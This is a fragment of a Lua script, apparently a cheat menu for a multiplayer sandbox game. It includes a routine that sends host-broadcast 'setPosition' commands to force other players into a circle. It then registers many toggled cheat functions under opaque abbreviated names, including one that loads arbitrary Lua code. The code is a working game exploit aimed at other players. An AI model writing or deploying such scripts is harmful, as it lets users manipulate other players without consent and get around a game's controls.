                local pz = cz + radius * math.sin(angle)
                
                local tdata = {
                    [1] = "player",
                    [2] = "setPosition",
                    [3] = {targetUin, px, cy + 1, pz}
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                count = count + 1
            end
        end
    end
    ShowGameTipsWithoutFilter("#c00ff00Đã xếp " .. count .. " người chơi thành vòng tròn")
end
-- ==================== os_load调用 ====================
os_load("rwdx",   [===[ rwdx() ]===],   [===[ rwdx() ]===])
os_load("rwtx",   [===[ rwtx() ]===],   [===[ rwtx() ]===])
os_load("rwjs",   [===[ rwjs_speed() ]===], [===[ rwjs_speed() ]===])
os_load("zhjqr",  [===[ zhjqr() ]===],  [===[ zhjqr() ]===])
os_load("zdjqr",  [===[ zdjqr() ]===],  [===[ zdjqr() ]===])
os_load("zdkr",   [===[ zdkr() ]===],   [===[ zdkr() ]===])
os_load("tjzd",   [===[ tjzd() ]===],   [===[ tjzd() ]===])
os_load("jjzd",   [===[ jjzd() ]===],   [===[ jjzd() ]===])
os_load("gbfj",   [===[ gbfj() ]===],   [===[ gbfj() ]===])
os_load("gbtq",   [===[ gbtq() ]===],   [===[ gbtq() ]===])
os_load("cggj",   [===[ cggj() ]===],   [===[ cggj() ]===])
os_load("qzhy",   [===[ qzhy() ]===],   [===[ qzhy() ]===])
os_load("sqfw",   [===[ sqfw() ]===],   [===[ sqfw() ]===])
os_load("qswj",   [===[ qswj() ]===],   [===[ qswj() ]===])
os_load("ggmx",   [===[ ggmx() ]===],   [===[ ggmx() ]===])
os_load("wqfm",   [===[ wqfm() ]===],   [===[ wqfm() ]===])
os_load("Fxms",   [===[ Fxms(true) ]===], [===[ Fxms(false) ]===])
os_load("ydfh",   [===[ ydfh_all_1=true ydfh_all(0) ]===], [===[ ydfh_all_1=false ]===])
os_load("wdtz",   [===[ wdtz_all_1=true wdtz_all(0) ]===], [===[ wdtz_all_1=false ]===])
os_load("load_lua", [===[ lua_load_OnClick() ]===], [===[ lua_load_OnClick() ]===])
os_load("jdfk",   [===[ jdfk_all_1=true jdfk_all(0) ]===], [===[ jdfk_all_1=false ]===])
